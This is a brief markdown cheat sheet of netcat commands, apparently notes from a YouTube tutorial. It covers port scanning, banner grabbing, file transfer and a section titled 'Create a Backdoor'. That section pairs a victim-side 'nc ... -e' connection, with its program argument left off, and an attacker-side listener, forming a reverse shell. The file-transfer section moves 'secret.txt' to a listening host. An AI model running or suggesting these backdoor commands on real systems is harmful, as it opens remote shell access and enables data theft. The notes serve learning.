
### **Objectives:**
- Network Scan
- Banner Grabbing
- Backdoor
- Execute Binary Files
- Share Files Through `NETcat`


### **Switches:**

`-l` : LISTEN
`-v` : VERBOSIN
`-p` : PORT
`-w` : TIMEOUT
`-n` : DONT RESOLVE
`-e` : EXECUTE COMMANDS
`-z` : PORT SCAN


### **Scan the Network**

```
nc -zvw 1 192.168.105 1-100
```

### **Scan the Network with Timeout**

```
nc -zvnw 1 18.192.172.30 1-100
```


### **Banner Grabbing**

```
echo "" | nc -vn 192.168.0.105 22
```

```
echo "" | nc -vn 192.168.0.105 80
```


### **Create a Backdoor**

*Command to run on Victims System :*
```
nc -v 192.168.0.107 4040 -e 
```


*Command to run on Attackers System:*
```
nc -lvp 4040
```


### **Transfer Files Between Two System**

*Command to run on Attackers System:*
```
nc -vn 192.168.0.107 7777 < secret.txt
```

*Command to run on Victims System :*
```
nc -lvp 7777 > secret.txt
```






**Resource :**
[NetCat Tutorial in Depth | What is NetCat? How NetCat Works? Share Files Through NetCat | BackDoor 🐈](https://www.youtube.com/watch?v=Wzc9cgEar7g)
